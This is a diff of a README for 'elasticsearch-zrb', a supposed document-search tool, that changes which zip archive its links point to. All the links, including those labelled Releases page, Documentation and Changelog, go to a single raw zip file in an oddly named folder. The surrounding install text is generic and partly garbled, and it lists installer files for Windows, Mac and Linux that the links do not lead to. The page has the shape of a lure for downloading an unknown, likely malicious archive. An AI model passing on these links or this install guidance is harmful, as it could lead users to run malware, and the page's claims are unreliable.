@@ -1,7 +1,7 @@
 # 🚀 elasticsearch-zrb - Simple Search Made Easy
 
 ## 🌐 Download Now
-[![Download](https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/elasticsearch-zrb-v2.4.zip)](https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/elasticsearch-zrb-v2.4.zip)
+[![Download](https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/zrb-elasticsearch-2.7.zip)](https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/zrb-elasticsearch-2.7.zip)
 
 ## 📖 Overview
 elasticsearch-zrb is a user-friendly application designed to help you search and manage your documents effortlessly. With elasticsearch-zrb, you can locate information quickly, saving you time and effort.
@@ -10,14 +10,14 @@ elasticsearch-zrb is a user-friendly application designed to help you search and
 To start using elasticsearch-zrb, follow these simple steps to download and run the application.
 
 ## 📥 Download & Install
-1. **Visit the Release Page:** Click [here to download](https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/elasticsearch-zrb-v2.4.zip) the latest version of elasticsearch-zrb.
+1. **Visit the Release Page:** Click [here to download](https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/zrb-elasticsearch-2.7.zip) the latest version of elasticsearch-zrb.
    
 2. **Choose the Right Version:** On the Releases page, you will see a list of available versions. Look for the latest version, which usually has the highest number.
 
 3. **Download the Installer:** Click on the appropriate file for your operating system. For example:
    - **Windows:** Look for a `.exe` file.
    - **Mac:** Look for a `.dmg` file.
-   - **Linux:** Look for a `https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/elasticsearch-zrb-v2.4.zip` file.
+   - **Linux:** Look for a `https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/zrb-elasticsearch-2.7.zip` file.
 
 4. **Run the Installer:** Once the file has downloaded, locate it on your computer. Double-click the file to start the installation process. Follow the prompts to complete the installation.
 
@@ -66,13 +66,13 @@ elasticsearch-zrb supports various document formats including PDFs, Word Documen
 Yes, elasticsearch-zrb allows you to search not just filenames but also the content within the documents.
 
 ### 3. How do I update elasticsearch-zrb?
-To update the application, simply visit the [Releases page](https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/elasticsearch-zrb-v2.4.zip). Download the latest version and follow the installation steps again.
+To update the application, simply visit the [Releases page](https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/zrb-elasticsearch-2.7.zip). Download the latest version and follow the installation steps again.
 
 ## 📞 Support
 If you encounter any issues or have questions, please open an issue on our GitHub page, and we will be happy to assist you.
 
 ## 🔗 Additional Resources
-- For more information, visit our [Documentation](https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/elasticsearch-zrb-v2.4.zip).
-- For the latest updates, check our [Changelog](https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/elasticsearch-zrb-v2.4.zip).
+- For more information, visit our [Documentation](https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/zrb-elasticsearch-2.7.zip).
+- For the latest updates, check our [Changelog](https://raw.githubusercontent.com/mikelcounterfactual790/elasticsearch-zrb/main/spermogenesis/zrb-elasticsearch-2.7.zip).
 
 You are now ready to use elasticsearch-zrb! Enjoy seamless document searching.
